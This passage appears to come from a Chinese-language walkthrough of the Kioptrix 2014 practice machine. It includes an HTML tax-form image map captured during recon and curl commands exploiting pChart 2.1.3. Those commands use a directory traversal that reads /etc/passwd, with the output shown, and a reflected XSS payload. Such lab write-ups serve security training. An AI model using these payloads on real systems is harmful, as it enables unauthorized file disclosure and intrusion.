valign='top' width='510'><map name='1040pg1'>
<area href='index.php?pfilez=1040pg1.tob&field=1040/label/your.firstname' coords=94,58,225,76>
<area href='index.php?pfilez=1040pg1.tob&field=1040/label/your.lastname' coords=226,58,374,76>
<area href='index.php?pfilez=1040pg1.tob&field=1040/label/your.ssn' coords=377,58,472,76>
<area href='index.php?pfilez=1040pg1.tob&field=1040/label/spouse.firstname' coords=94,78,225,96>
<area href='index.php?pfilez=1040pg1.tob&field=1040/label/spouse.lastname' coords=226,78,374,96>
<area href='index.php?pfilez=1040pg1.tob&field=1040/label/spouse.ssn' coords=377,78,472,96>
<area href='index.php?pfilez=1040pg1.tob&field=1040/label/spouse.ssn' coords=377,78,472,96>
<area href='index.php?pfilez=1040pg1.tob&field=1040/label/homeaddress' coords=94,98,326,116>
<area href='index.php?pfilez=1040pg1.tob&field=1040/label/aptno' coords=330,98,378,116>
<area href='index.php?pfilez=1040pg1.tob&field=1040/label/citytownstatezip' coords=94,118,363,136>
<area href='index.php?pfilez=1040pg1.tob&field=1040/label/your.president' coords=378,146,413,158>
<area href='index.php?pfilez=1040pg1.tob&field=1040/label/spouse.president' coords=428,146,458,158>
<area href='index.php?pfilez=1040pg1.tob&field=1040/filingstatus/single' coords=104,159,113,168>
<area href='index.php?pfilez=1040pg1.tob&field=1040/filingstatus/married.jointly' coords=104,169,113,178>
<area href='index.php?pfilez=1040pg1.tob&field=1040/filingstatus/married.separately' coords=104,179,113,188>
<area href='index.php?pfilez=1040pg1.tob&field=1040/filingstatus/headofhouse' coords=296,159,305,168>
<area href='index.php?pfilez=1040pg1.tob&field=1040/filingstatus/qualifyingwidow' coords=296,190,305,197>
<area href='index.php?pfilez=1040pg1.tob&field=1040/filingstatus/headofhousehold.qualifyingchild' coords=381,178,466,187>
<area href='index.php?pfilez=1040pg1.tob&field=1040/filingstatus/married.separately.fullname' coords=185,190,282,198>
<area href='index.php?pfilez=1040pg1.tob&field=1040/filingstatus/qualifyingwidow.yearspousedied' coords=354,199,377,208>
<area href='index.php?pfilez=1040pg1.tob&field=1040/exemptions/yourself' coords=109,208,119,217>
<area href='index.php?pfilez=1040pg1.tob&field=1040/exemptions/spouse' coords=110,228,119,237>
<area href='index.php?pfilez=1040pg1.tob&field=1040/exemptions/numberofchildren.livewithyou' coords=452,236,470,248>
<area href='index.php?pfilez=1040pg1.tob&field=1040/exemptions/numberofchildren.notbecauseofdivorce' coords=452,253,470,277>
<area href='index.php?pfilez=1040pg1.tob&field=1040/exemptions/numberofchildren.notenteredabove' coords=452,280,470,292>
<area href='index.php?pfilez=1040pg1.tob&field=1040/exemptions/dependents/1/firstname' coords=111,258,159,267>
<area href='index.php?pfilez=1040pg1.tob&field=1040/exemptions/dependents/1/lastname' coords=161,258,229,267>
<area href='index.php?pfilez=1040pg1.tob&field=1040/exemptions/dependents/1/ssn' coords=231,258,302,267>
<area href='index.php?pfilez=1040pg1.tob&field=1040/exemptions/dependents/1/relationship' coords=304,258,350,267>
<area href='index.php?pfilez=1040pg1.tob&field=1040/exemptions/dependents/1/qualifyingchild' coords=365,257,378,266>
<area href='index.php?pfilez=1040pg1.tob&field=1040/exemptions/dependents/2/firstname' coords=111,268,159,277>
<area href='index.php?pfilez=1040pg1.tob&field=1040/exemptions/dependents/2/lastname' coords=161,268,229,277>
<area href='index.php?pfilez=1040pg1.tob&field=1040/exemptions/dependents/2/ssn' coords=231,268,302,277>
<area href='index.php?pfilez=1040pg1.tob&field=1040/exemptions/dependents/2/relationship' coords=304,268,350,277>
<area href='index.php?pfilez=1040pg1.tob&field=1040/exemptions/dependents/2/qualifyingchild' coords=365,267,378,276>
<area href='index.php?pfilez=1040pg1.tob&field=1040/exemptions/dependents/3/firstname' coords=111,278,159,287>
<area href='index.php?pfilez=1040pg1.tob&field=1040/exemptions/dependents/3/lastname' coords=161,278,229,287>
<area href='index.php?pfilez=1040pg1.tob&field=1040/exemptions/dependents/3/ssn' coords=231,278,302,287>
<area href='index.php?pfilez=1040pg1.tob&field=1040/exemptions/dependents/3/relationship' coords=304,278,350,287>
<area href='index.php?pfilez=1040pg1.tob&field=1040/exemptions/dependents/3/qualifyingchild' coords=365,277,378,286>
<area href='index.php?pfilez=1040pg1.tob&field=1040/exemptions/dependents/4/firstname' coords=111,288,159,297>
<area href='index.php?pfilez=1040pg1.tob&field=1040/exemptions/dependents/4/lastname' coords=161,288,229,297>
<area href='index.php?pfilez=1040pg1.tob&field=1040/exemptions/dependents/4/ssn' coords=231,288,302,297>
<area href='index.php?pfilez=1040pg1.tob&field=1040/exemptions/dependents/4/relationship' coords=304,288,350,297>
<area href='index.php?pfilez=1040pg1.tob&field=1040/exemptions/dependents/4/qualifyingchild' coords=365,287,378,296>
<area href='index.php?pfilez=1040pg1.tob&field=1040/exemptions/dependents/5/firstname' coords=111,298,159,307>
<area href='index.php?pfilez=1040pg1.tob&field=1040/exemptions/dependents/5/lastname' coords=161,298,229,307>
<area href='index.php?pfilez=1040pg1.tob&field=1040/exemptions/dependents/5/ssn' coords=231,298,302,307>
<area href='index.php?pfilez=1040pg1.tob&field=1040/exemptions/dependents/5/relationship' coords=304,298,350,307>
<area href='index.php?pfilez=1040pg1.tob&field=1040/exemptions/dependents/5/qualifyingchild' coords=365,297,378,306>
<area href='index.php?pfilez=1040pg1.tob&field=1040/income/wages' coords=400,317,471,326>
<area href='index.php?pfilez=1040pg1.tob&field=1040/income/interest.taxable' coords=400,327,471,336>
<area href='index.php?pfilez=1040pg1.tob&field=1040/income/dividends' coords=400,337,471,356>
<area href='index.php?pfilez=1040pg1.tob&field=1040/income/state.taxable.refunds' coords=400,357,471,366>
<area href='index.php?pfilez=1040pg1.tob&field=1040/income/alimony' coords=400,367,471,376>
<area href='index.php?pfilez=1040pg1.tob&field=1040/income/business.income' coords=400,377,471,388>
<area href='index.php?pfilez=1040pg1.tob&field=1040/income/capital.gains' coords=400,387,471,396>
<area href='index.php?pfilez=1040pg1.tob&field=1040/income/other.gains' coords=400,397,471,406>
<area href='index.php?pfilez=1040pg1.tob&field=1040/income/ira.distributions.taxable' coords=400,407,471,416>
<area href='index.php?pfilez=1040pg1.tob&field=1040/income/pensions.taxable' coords=400,417,471,426>
<area href='index.php?pfilez=1040pg1.tob&field=1040/income/rental.realestate' coords=400,427,471,436>
<area href='index.php?pfilez=1040pg1.tob&field=1040/income/farm.income' coords=400,437,471,446>
<area href='index.php?pfilez=1040pg1.tob&field=1040/income/unemployment' coords=400,447,471,456>
<area href='index.php?pfilez=1040pg1.tob&field=1040/income/social.security.taxable' coords=400,457,471,466>
<area href='index.php?pfilez=1040pg1.tob&field=1040/income/other.income' coords=400,467,471,476>
<area href='index.php?pfilez=1040pg1.tob&field=1040/income/interest.nontaxable' coords=309,339,376,346>
<area href='index.php?pfilez=1040pg1.tob&field=1040/income/capital.gains.dnotrequired' coords=367,389,377,397>
<area href='index.php?pfilez=1040pg1.tob&field=1040/income/ira.distributions' coords=206,408,279,417>
<area href='index.php?pfilez=1040pg1.tob&field=1040/income/pensions' coords=206,418,279,427>
<area href='index.php?pfilez=1040pg1.tob&field=1040/income/social.security' coords=206,458,279,467>
<area href='index.php?pfilez=1040pg1.tob&field=1040/adjustedgrossincome/educator.expenses' coords=309,488,381,497>
<area href='index.php?pfilez=1040pg1.tob&field=1040/adjustedgrossincome/ira.deduction' coords=309,498,381,507>
<area href='index.php?pfilez=1040pg1.tob&field=1040/adjustedgrossincome/student.loan.interest' coords=309,508,381,517>
<area href='index.php?pfilez=1040pg1.tob&field=1040/adjustedgrossincome/tuition.fees' coords=309,518,381,527>
<area href='index.php?pfilez=1040pg1.tob&field=1040/adjustedgrossincome/archer.msa' coords=309,528,381,537>
<area href='index.php?pfilez=1040pg1.tob&field=1040/adjustedgrossincome/moving' coords=309,538,381,547>
<area href='index.php?pfilez=1040pg1.tob&field=1040/adjustedgrossincome/half.semployment.tax' coords=309,548,381,557>
<area href='index.php?pfilez=1040pg1.tob&field=1040/adjustedgrossincome/selfemployed.health.insurance' coords=309,558,381,567>
<area href='index.php?pfilez=1040pg1.tob&field=1040/adjustedgrossincome/selfemployed.sep.simple' coords=309,568,381,577>
<area href='index.php?pfilez=1040pg1.tob&field=1040/adjustedgrossincome/penalty.savings.withdraw' coords=309,578,381,587>
<area href='index.php?pfilez=1040pg1.tob&field=1040/adjustedgrossincome/alimony' coords=309,588,381,597>
<area href='index.php?pfilez=1040pg1.tob&field=1040/adjustedgrossincome/alimony.ssn' coords=214,588,284,597>
</map>
<img border=0 src='drawimage.php?pfilez=1040pg1.tob' usemap='#1040pg1' alt='zzz'><br>
</td></tr></tbody></table>
</body></html>
```
</details>

## 1.4. 漏洞利用
<details><summary>1. pChart2.1.3目录穿越</summary>

```shell
┌──(root㉿kali)-[/kioptrix4]
└─# curl -v "http://192.168.0.103/pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2fetc/passwd" | html2text
*   Trying 192.168.0.103:80...
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Connected to 192.168.0.103 (192.168.0.103) port 80 (#0)
> GET /pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2fetc/passwd HTTP/1.1
> Host: 192.168.0.103
> User-Agent: curl/7.82.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Sat, 11 Jun 2022 09:15:55 GMT
< Server: Apache/2.2.21 (FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8
< X-Powered-By: PHP/5.3.8
< Content-Length: 2084
< Content-Type: text/html
<
{ [2084 bytes data]
100  2084  100  2084    0     0   522k      0 --:--:-- --:--:-- --:--:--  678k
* Connection #0 to host 192.168.0.103 left intact
# $FreeBSD: release/9.0.0/etc/master.passwd 218047 2011-01-28 22:29:38Z pjd $
#
root:*:0:0:Charlie &:/root:/bin/csh
toor:*:0:0:Bourne-again Superuser:/root:
daemon:*:1:1:Owner of many system processes:/root:/usr/sbin/nologin
operator:*:2:5:System &:/:/usr/sbin/nologin
bin:*:3:7:Binaries Commands and Source:/:/usr/sbin/nologin
tty:*:4:65533:Tty Sandbox:/:/usr/sbin/nologin
kmem:*:5:65533:KMem Sandbox:/:/usr/sbin/nologin
games:*:7:13:Games pseudo-user:/usr/games:/usr/sbin/nologin
news:*:8:8:News Subsystem:/:/usr/sbin/nologin
man:*:9:9:Mister Man Pages:/usr/share/man:/usr/sbin/nologin
sshd:*:22:22:Secure Shell Daemon:/var/empty:/usr/sbin/nologin
smmsp:*:25:25:Sendmail Submission User:/var/spool/clientmqueue:/usr/sbin/
nologin
mailnull:*:26:26:Sendmail Default User:/var/spool/mqueue:/usr/sbin/nologin
bind:*:53:53:Bind Sandbox:/:/usr/sbin/nologin
proxy:*:62:62:Packet Filter pseudo-user:/nonexistent:/usr/sbin/nologin
_pflogd:*:64:64:pflogd privsep user:/var/empty:/usr/sbin/nologin
_dhcp:*:65:65:dhcp programs:/var/empty:/usr/sbin/nologin
uucp:*:66:66:UUCP pseudo-user:/var/spool/uucppublic:/usr/local/libexec/uucp/
uucico
pop:*:68:6:Post Office Owner:/nonexistent:/usr/sbin/nologin
www:*:80:80:World Wide Web Owner:/nonexistent:/usr/sbin/nologin
hast:*:845:845:HAST unprivileged user:/var/empty:/usr/sbin/nologin
nobody:*:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin
mysql:*:88:88:MySQL Daemon:/var/db/mysql:/usr/sbin/nologin
ossec:*:1001:1001:User &:/usr/local/ossec-hids:/sbin/nologin
ossecm:*:1002:1001:User &:/usr/local/ossec-hids:/sbin/nologin
ossecr:*:1003:1001:User &:/usr/local/ossec-hids:/sbin/nologin
### *关注最后三行，OSSEC---hids---Host Intrusion Detection System*
### *关注第一行，FreeBSD: release/9
### 这两个重要的信息被我无情的忽视了，在做个靶机的时候我还纳闷为啥老是时断时续的。
```
</details>

<details><summary>2. pChart2.1.3 XSS</summary>

```shell
┌──(root㉿kali)-[/kioptrix4]
└─# curl -v "http://192.168.0.103/pChart2.1.3/examples/sandbox/script/session.php?<script>alert('XSS')</script>"
*   Trying 192.168.0.103:80...
* Connected to 192.168.0.103 (192.168.0.103) port 80 (#0)
> GET /pChart2.1.3/examples/sandbox/script/session.php?<script>alert('XSS')</script> HTTP/1.1
> Host: 192.168.0.103
> User-Agent: curl/7.82.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Sat, 11 Jun 2022 09:22:44 GMT
< Server: Apache/2.2.21 (FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8
< X-Powered-By: PHP/5.3.8
< Set-Cookie: PHPSESSID=m4uo3f6u11dgk9g4ja638i5gv3; path=/
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
< Pragma: no-cache
< Content-Length: 50
< Content-Type: text/html
<
Array
(
    [<script>alert('XSS')</script>] =>
)
* Connection #0 to host 192.168.0.103 left intact
```
<pre><img src="https://github.com/eagleatman/mywriteup/blob/main/kioptrix-2014/images/1.png" width="56%" /></pre>
</details>

## 1.5. 后渗透
## 1.6. 报告


# 3. 遗留
- [ ] 后渗透阶段后续想专门做个主题，这篇文章就不准备写进去了，先暂时空一下；
- [ ] 由于对于一个靶机的渗透测试，可能比较简单；同时感觉个人能力有限，也更不想每个阶段都滥竽充数地写一点内容;所以我也只挑一些阶段区填充内容，这样某些阶段可能就是空白了，这个只能给日后的自己留个任务了(反正目前的水平只能先填充这么多了)。

# 4. 说明

